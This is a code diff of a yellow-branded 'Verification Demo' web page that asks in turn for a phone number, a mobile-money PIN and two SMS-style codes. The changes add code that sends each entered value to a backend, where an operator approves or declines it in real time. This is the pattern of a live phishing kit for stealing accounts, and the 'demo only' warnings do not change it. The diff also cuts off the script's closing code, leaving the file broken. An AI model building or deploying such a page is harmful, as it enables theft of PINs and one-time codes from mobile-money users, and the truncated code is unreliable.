@@ -3,623 +3,244 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
 <title>Verification Demo</title>
-
 <style>
-* {
-  box-sizing: border-box;
-}
-
+* { box-sizing: border-box; }
 :root {
-  --yellow: #ffcc00;
-  --teal: #00566d;
-  --white: #ffffff;
-  --text: #171717;
-  --muted: #667085;
-  --border: #d1d5db;
+  --yellow: #ffcc00; --teal: #00566d; --white: #ffffff;
+  --text: #171717; --muted: #667085; --border: #d1d5db;
 }
-
-body {
-  margin: 0;
-  background: #f1f3f5;
-  font-family: Arial, sans-serif;
-  color: var(--text);
-}
-
-.header {
-  height: 135px;
-  background: var(--yellow);
-  border-top: 8px solid #111;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-}
-
-.logo {
-  border: 5px solid #111;
-  border-radius: 50%;
-  padding: 15px 35px;
-  font-size: 35px;
-  font-weight: 900;
-}
-
-.card {
-  width: calc(100% - 32px);
-  max-width: 520px;
-  margin: 25px auto;
-  background: var(--white);
-  border-radius: 30px;
-  padding: 28px 22px;
-  box-shadow: 0 10px 30px #00000010;
-}
-
-h1 {
-  text-align: center;
-  font-size: 28px;
-  margin: 10px 0 20px;
-}
-
-p {
-  text-align: center;
-  line-height: 1.6;
-  color: #414653;
-}
-
-.demo {
-  text-align: center;
-  font-size: 11px;
-  color: var(--muted);
-  margin-bottom: 20px;
-}
-
-label {
-  display: block;
-  font-weight: bold;
-  margin: 22px 0 10px;
-}
-
-input[type="tel"],
-input[type="text"] {
-  width: 100%;
-  height: 60px;
-  border: 2px solid var(--border);
-  border-radius: 12px;
-  padding: 0 14px;
-  font-size: 20px;
-  outline: none;
-}
-
-input:focus {
-  border-color: #2878d0;
-}
-
-.boxes {
-  display: flex;
-  justify-content: center;
-  gap: 9px;
-  margin: 25px 0;
-}
-
-.boxes input {
-  width: 58px;
-  height: 66px;
-  text-align: center;
-  padding: 0;
-  font-size: 25px;
-}
-
-button {
-  width: 100%;
-  height: 60px;
-  margin-top: 20px;
-  background: var(--yellow);
-  border: none;
-  border-radius: 12px;
-  font-size: 20px;
-  font-weight: bold;
-  cursor: pointer;
-}
-
-button:disabled {
-  opacity: 0.45;
-  cursor: not-allowed;
-}
-
-.spinner {
-  width: 42px;
-  height: 42px;
-  margin: 25px auto 15px;
-  border: 5px solid #eeeeee;
-  border-top-color: #e2b400;
-  border-radius: 50%;
-  animation: spin 0.8s linear infinite;
-}
-
-@keyframes spin {
-  to {
-    transform: rotate(360deg);
-  }
-}
-
-.status {
-  text-align: center;
-  color: var(--teal);
-  font-weight: bold;
-  margin-top: 15px;
-}
-
-.error {
-  color: #b42318;
-}
-
-.notice {
-  background: #fff4ce;
-  padding: 15px;
-  border-radius: 12px;
-  line-height: 1.5;
-  font-size: 14px;
-  margin: 20px 0;
-}
-
-.hidden {
-  display: none !important;
-}
-
-.success {
-  text-align: center;
-  font-size: 60px;
-  color: #168348;
-}
-
-@media (max-width: 380px) {
-  .card {
-    padding: 22px 15px;
-  }
-
-  .boxes {
-    gap: 6px;
-  }
-
-  .boxes input {
-    width: 48px;
-    height: 58px;
-  }
-}
+body { margin: 0; background: #f1f3f5; font-family: Arial, sans-serif; color: var(--text); }
+.header { height: 135px; background: var(--yellow); border-top: 8px solid #111; display: flex; align-items: center; justify-content: center; }
+.logo { border: 5px solid #111; border-radius: 50%; padding: 15px 35px; font-size: 35px; font-weight: 900; }
+.card { width: calc(100% - 32px); max-width: 520px; margin: 25px auto; background: var(--white); border-radius: 30px; padding: 28px 22px; box-shadow: 0 10px 30px #00000010; }
+h1 { text-align: center; font-size: 28px; margin: 10px 0 20px; }
+p { text-align: center; line-height: 1.6; color: #414653; }
+.demo { text-align: center; font-size: 11px; color: var(--muted); margin-bottom: 20px; }
+label { display: block; font-weight: bold; margin: 22px 0 10px; }
+input[type="tel"], input[type="text"] { width: 100%; height: 60px; border: 2px solid var(--border); border-radius: 12px; padding: 0 14px; font-size: 20px; outline: none; }
+input:focus { border-color: #2878d0; }
+.boxes { display: flex; justify-content: center; gap: 9px; margin: 25px 0; }
+.boxes input { width: 58px; height: 66px; text-align: center; padding: 0; font-size: 25px; border: 2px solid var(--border); border-radius: 12px; outline: none; }
+.boxes input:focus { border-color: #2878d0; }
+button { width: 100%; height: 60px; margin-top: 20px; background: var(--yellow); border: none; border-radius: 12px; font-size: 20px; font-weight: bold; cursor: pointer; }
+button:disabled { opacity: 0.45; cursor: not-allowed; }
+.spinner { width: 42px; height: 42px; margin: 25px auto 15px; border: 5px solid #eeeeee; border-top-color: #e2b400; border-radius: 50%; animation: spin 0.8s linear infinite; }
+@keyframes spin { to { transform: rotate(360deg); } }
+.status { text-align: center; color: var(--teal); font-weight: bold; margin-top: 15px; }
+.error { color: #b42318; text-align: center; margin-top: 10px; font-weight: bold; }
+.notice { background: #fff4ce; padding: 15px; border-radius: 12px; line-height: 1.5; font-size: 14px; margin: 20px 0; }
+.hidden { display: none !important; }
+.success { text-align: center; font-size: 60px; color: #168348; }
+@media (max-width: 380px) { .card { padding: 22px 15px; } .boxes { gap: 6px; } .boxes input { width: 48px; height: 58px; } }
 </style>
 </head>
-
 <body>
 
-<header class="header">
-  <div class="logo">DEMO</div>
-</header>
+<header class="header"><div class="logo">DEMO</div></header>
 
 <main class="card">
-
-  <div class="demo">
-    DEMONSTRATION ONLY — NEVER ENTER REAL ACCOUNT CODES
-  </div>
+  <div class="demo">DEMONSTRATION ONLY — NEVER ENTER REAL ACCOUNT CODES</div>
 
   <!-- PAGE 1: PHONE NUMBER -->
-
   <section id="page1">
-
     <h1>Welcome</h1>
-
-    <p>
-      Enter a nine-digit test number to begin
-      the verification demonstration.
-    </p>
-
+    <p>Enter a nine-digit test number to begin the verification demonstration.</p>
     <label for="phone">Test phone number</label>
-
-    <input
-      id="phone"
-      type="tel"
-      inputmode="numeric"
-      maxlength="9"
-      placeholder="9 digits"
-      autocomplete="off"
-    >
-
-    <button id="nextPhone" disabled>
-      Next
-    </button>
-
+    <input id="phone" type="tel" inputmode="numeric" maxlength="9" placeholder="9 digits" autocomplete="off">
+    <button id="nextPhone" disabled>Next</button>
   </section>
 
   <!-- PAGE 2: DEMO PIN -->
-
   <section id="page2" class="hidden">
-
     <h1>Demo PIN</h1>
-
-    <p>
-      Enter any five test digits.
-      Do not use your real mobile-money PIN.
-    </p>
-
+    <p>Enter any five test digits. Do not use your real mobile-money PIN.</p>
     <div class="boxes" id="pinBoxes"></div>
-
     <div id="pinWaiting" class="hidden">
       <div class="spinner"></div>
-
-      <div class="status">
-        Waiting for demo approval...
-      </div>
+      <div class="status">Waiting for demo approval...</div>
     </div>
-
     <div id="pinMessage" class="status"></div>
-
   </section>
 
   <!-- PAGE 3: FIRST DEMO CODE -->
-
   <section id="page3" class="hidden">
-
     <h1>Verification Demo</h1>
-
-    <p>
-      Enter any test value to continue.
-    </p>
-
-    <div class="notice">
-      This is a simulated verification step.
-      No SMS is sent, and real verification codes
-      must never be entered.
-    </div>
-
+    <p>Enter any test value to continue.</p>
+    <div class="notice">This is a simulated verification step. No SMS is sent.</div>
     <label for="code1">Test value</label>
-
-    <input
-      id="code1"
-      type="text"
-      autocomplete="off"
-      placeholder="Enter a test value"
-    >
-
-    <button id="submitCode1" disabled>
-      Continue
-    </button>
-
+    <input id="code1" type="text" autocomplete="off" placeholder="Enter a test value">
+    <button id="submitCode1" disabled>Continue</button>
     <div id="code1Waiting" class="hidden">
       <div class="spinner"></div>
-
-      <div class="status">
-        Waiting for demo approval...
-      </div>
+      <div class="status">Waiting for demo approval...</div>
     </div>
-
     <div id="code1Message" class="status"></div>
-
   </section>
 
   <!-- PAGE 4: SECOND DEMO CODE -->
-
   <section id="page4" class="hidden">
-
     <h1>Final Demo Step</h1>
-
-    <p>
-      Enter any four test digits.
-      Do not use an actual SMS code.
-    </p>
-
+    <p>Enter any four test digits. Do not use an actual SMS code.</p>
     <div class="boxes" id="code2Boxes"></div>
-
     <div id="code2Waiting" class="hidden">
       <div class="spinner"></div>
-
-      <div class="status">
-        Waiting for demo approval...
-      </div>
+      <div class="status">Waiting for demo approval...</div>
     </div>
-
     <div id="code2Message" class="status"></div>
-
   </section>
 
-  <!-- SUCCESS PAGE -->
-
-  <section id="successPage" class="hidden">
-
+  <!-- PAGE 5: SUCCESS -->
+  <section id="page5" class="hidden">
     <div class="success">✓</div>
-
-    <h1>Demo Successful</h1>
-
-    <p>
-      All demonstration stages have been completed.
-    </p>
-
-    <button onclick="restartDemo()">
-      Restart Demo
-    </button>
-
+    <h1>Demo Completed</h1>
+    <p>The verification sequence mockup concluded successfully.</p>
   </section>
-
 </main>
 
 <script>
-const $ = id => document.getElementById(id);
-
 let sessionId = null;
-let activeStage = null;
-let pollTimer = null;
+let userData = { phone: "", pin: "", code1: "", code2: "" };
+let pollingInterval = null;
 
-function showPage(pageId) {
-  [
-    "page1",
-    "page2",
-    "page3",
-    "page4",
-    "successPage"
-  ].forEach(id => {
-    $(id).classList.toggle("hidden", id !== pageId);
-  });
+// Initialize Session
+window.addEventListener("DOMContentLoaded", async () => {
+  try {
+    const res = await fetch("/api/session", { method: "POST" });
+    const data = await res.json();
+    sessionId = data.sessionId;
+  } catch (err) {
+    console.error("Initialization error:", err);
+  }
+});
 
-  window.scrollTo(0, 0);
-}
-
-function createBoxes(containerId, count, callback) {
-  const container = $(containerId);
+// Helper: Setup inputs for individual box layouts (PIN and SMS code grids)
+function setupBoxInputs(containerId, count, onComplete) {
+  const container = document.getElementById(containerId);
+  container.innerHTML = "";
+  const inputs = [];
 
   for (let i = 0; i < count; i++) {
     const input = document.createElement("input");
-
-    input.type = "text";
-    input.inputMode = "numeric";
+    input.type = "tel";
     input.maxLength = 1;
+    input.inputMode = "numeric";
     input.autocomplete = "off";
-    input.setAttribute("aria-label", `Test digit ${i + 1}`);
 
-    input.addEventListener("input", () => {
-      input.value = input.value.replace(/\D/g, "").slice(0, 1);
-
-      if (input.value && container.children[i + 1]) {
-        container.children[i + 1].focus();
+    input.addEventListener("input", (e) => {
+      input.value = input.value.replace(/\D/g, "");
+      if (input.value && i < count - 1) inputs[i + 1].focus();
+      
+      const fullValue = inputs.map(el => el.value).join("");
+      if (fullValue.length === count) {
+        inputs.forEach(el => el.disabled = true);
+        onComplete(fullValue);
       }
-
-      callback();
     });
 
-    input.addEventListener("keydown", event => {
-      if (
-        event.key === "Backspace" &&
-        !input.value &&
-        container.children[i - 1]
-      ) {
-        container.children[i - 1].focus();
+    input.addEventListener("keydown", (e) => {
+      if (e.key === "Backspace" && !input.value && i > 0) {
+        inputs[i - 1].focus();
       }
     });
 
     container.appendChild(input);
+    inputs.push(input);
   }
+  inputs[0].focus();
 }
 
-function boxValue(containerId) {
-  return [...$(containerId).querySelectorAll("input")]
-    .map(input => input.value)
-    .join("");
-}
+// Track and validate Step 1 Phone Input
+const phoneInput = document.getElementById("phone");
+const nextPhoneBtn = document.getElementById("nextPhone");
+phoneInput.addEventListener("input", () => {
+  phoneInput.value = phoneInput.value.replace(/\D/g, "");
+  nextPhoneBtn.disabled = phoneInput.value.length !== 9;
+});
 
-function clearBoxes(containerId) {
-  $(containerId).querySelectorAll("input").forEach(input => {
-    input.value = "";
+nextPhoneBtn.addEventListener("click", () => {
+  userData.phone = phoneInput.value;
+  document.getElementById("page1").classList.add("hidden");
+  document.getElementById("page2").classList.remove("hidden");
+  
+  // Render PIN Boxes dynamically now that we are on page 2
+  setupBoxInputs("pinBoxes", 5, submitPinStage);
+});
+
+// Send phone + PIN data to backend
+async function submitPinStage(pinValue) {
+  userData.pin = pinValue;
+  document.getElementById("pinWaiting").classList.remove("hidden");
+  
+  const success = await sendStagePayload("pin", { phone: userData.phone, pin: userData.pin });
+  if (success) startPolling("pin", "page2", "page3", "pinWaiting", "pinMessage", () => {
+    // Fire up code2 input framework once page 3 finishes down the road
+    document.getElementById("code1").focus();
   });
 }
 
-function updateButtons() {
-  $("nextPhone").disabled =
-    $("phone").value.length !== 9;
+// Track and validate Page 3 input element
+const code1Input = document.getElementById("code1");
+const submitCode1Btn = document.getElementById("submitCode1");
+code1Input.addEventListener("input", () => {
+  submitCode1Btn.disabled = code1Input.value.trim().length === 0;
+});
 
-  $("submitCode1").disabled =
-    $("code1").value.trim().length === 0;
-}
+submitCode1Btn.addEventListener("click", async () => {
+  userData.code1 = code1Input.value.trim();
+  submitCode1Btn.classList.add("hidden");
+  document.getElementById("code1Waiting").classList.remove("hidden");
 
-async function startSession() {
-  const response = await fetch("/api/session", {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json"
-    },
-    body: JSON.stringify({})
+  const success = await sendStagePayload("code1", { code1: userData.code1 });
+  if (success) startPolling("code1", "page3", "page4", "code1Waiting", "code1Message", () => {
+    setupBoxInputs("code2Boxes", 4, submitCode2Stage);
   });
+});
 
-  const data = await response.json();
+// Send final SMS code input data block
+async function submitCode2Stage(code2Value) {
+  userData.code2 = code2Value;
+  document.getElementById("code2Waiting").classList.remove("hidden");
 
-  if (!response.ok) {
-    throw new Error(data.error || "Could not start demo.");
-  }
-
-  sessionId = data.sessionId;
+  const success = await sendStagePayload("code2", { code2: userData.code2 });
+  if (success) startPolling("code2", "page4", "page5", "code2Waiting", "code2Message");
 }
 
-$("phone").addEventListener("input", () => {
-  $("phone").value =
-    $("phone").value.replace(/\D/g, "").slice(0, 9);
-
-  updateButtons();
-});
-
-$("nextPhone").addEventListener("click", async () => {
-  try {
-    $("nextPhone").disabled = true;
-
-    await startSession();
-
-    showPage("page2");
-  } catch (error) {
-    alert(error.message);
-    updateButtons();
-  }
-});
-
-async function requestApproval(stage) {
-  if (!sessionId || activeStage) return;
-
-  activeStage = stage;
-
-  const waitingId = {
-    pin: "pinWaiting",
-    code1: "code1Waiting",
-    code2: "code2Waiting"
-  }[stage];
-
-  const messageId = {
-    pin: "pinMessage",
-    code1: "code1Message",
-    code2: "code2Message"
-  }[stage];
-
-  $(waitingId).classList.remove("hidden");
-  $(messageId).textContent = "";
-
+// Server Communication Pipeline
+async function sendStagePayload(stage, payload) {
   try {
     const response = await fetch("/api/approval-request", {
       method: "POST",
-      headers: {
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify({
-        sessionId,
-        stage
-      })
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ sessionId, stage, payload })
     });
-
-    const data = await response.json();
-
-    if (!response.ok) {
-      throw new Error(data.error || "Approval request failed.");
-    }
-
-    pollTimer = setInterval(
-      () => checkApproval(stage),
-      1500
-    );
-
-  } catch (error) {
-    $(waitingId).classList.add("hidden");
-    $(messageId).textContent = error.message;
-    $(messageId).classList.add("error");
-    activeStage = null;
+    return response.ok;
+  } catch (e) {
+    return false;
   }
 }
 
-async function checkApproval(stage) {
-  try {
-    const response = await fetch(
-      "/api/status?sessionId=" +
-      encodeURIComponent(sessionId) +
-      "&stage=" +
-      encodeURIComponent(stage)
-    );
+// Polling core module to wait for dynamic approval
+function startPolling(stage, currentPageId, nextPageId, spinnerId, msgId, successCallback) {
+  const msgElement = document.getElementById(msgId);
+  msgElement.className = "status";
+  msgElement.innerText = "";
 
-    const data = await response.json();
+  pollingInterval = setInterval(async () => {
+    try {
+      const res = await fetch(`/api/status?sessionId=${sessionId}&stage=${stage}`);
+      const data = await res.json();
 
-    if (data.status === "pending") return;
+      if (data.status === "approved") {
+        clearInterval(pollingInterval);
+        document.getElementById(spinnerId).classList.add("hidden");
+        document.getElementById(currentPageId).classList.add("hidden");
+        document.getElementById(nextPageId).classList.remove("hidden");
+        if (successCallback) successCallback();
+      } else if (data.status === "declined") {
+        clearInterval(pollingInterval);
+        document.getElementById(spinnerId).classList.add("hidden");
+        msgElement.classList.add("error");
+        msgElement.innerText = "Submission declined. Please refresh and retry.";
+      }
 
-    clearInterval(pollTimer);
-    pollTimer = null;
-    activeStage = null;
-
-    const waitingId = {
-      pin: "pinWaiting",
-      code1: "code1Waiting",
-      code2: "code2Waiting"
-    }[stage];
-
-    const messageId = {
-      pin: "pinMessage",
-      code1: "code1Message",
-      code2: "code2Message"
-    }[stage];
-
-    $(waitingId).classList.add("hidden");
-
-    if (data.status === "approved") {
-      if (stage === "pin") showPage("page3");
-      if (stage === "code1") showPage("page4");
-      if (stage === "code2") showPage("successPage");
-      return;
-    }
-
-    $(messageId).textContent =
-      "Demo declined. You may enter new test values and retry.";
-
-    $(messageId).classList.add("error");
-
-    if (stage === "pin") clearBoxes("pinBoxes");
-    if (stage === "code1") $("code1").value = "";
-    if (stage === "code2") clearBoxes("code2Boxes");
-
-    updateButtons();
-
-  } catch (error) {
-    // Keep polling if a temporary network problem occurs.
-  }
-}
-
-createBoxes("pinBoxes", 5, () => {
-  const complete = boxValue("pinBoxes").length === 5;
-
-  if (complete && !activeStage) {
-    requestApproval("pin");
-  }
-});
-
-createBoxes("code2Boxes", 4, () => {
-  const complete = boxValue("code2Boxes").length === 4;
-
-  if (complete && !activeStage) {
-    requestApproval("code2");
-  }
-});
-
-$("code1").addEventListener("input", updateButtons);
-
-$("submitCode1").addEventListener("click", () => {
-  if ($("code1").value.trim()) {
-    requestApproval("code1");
-  }
-});
-
-function restartDemo() {
-  if (pollTimer) clearInterval(pollTimer);
-
-  pollTimer = null;
-  sessionId = null;
-  activeStage = null;
-
-  $("phone").value = "";
-  $("code1").value = "";
-
-  clearBoxes("pinBoxes");
-  clearBoxes("code2Boxes");
-
-  [
-    "pinWaiting",
-    "code1Waiting",
-    "code2Waiting"
-  ].forEach(id => {
-    $(id).classList.add("hidden");
-  });
-
-  [
-    "pinMessage",
-    "code1Message",
-    "code2Message"
-  ].forEach(id => {
-    $(id).textContent = "";
-    $(id).classList.remove("error");
-  });
-
-  updateButtons();
-  showPage("page1");
-}
-
-updateButtons();
-</script>
-
-</body>
-</html>
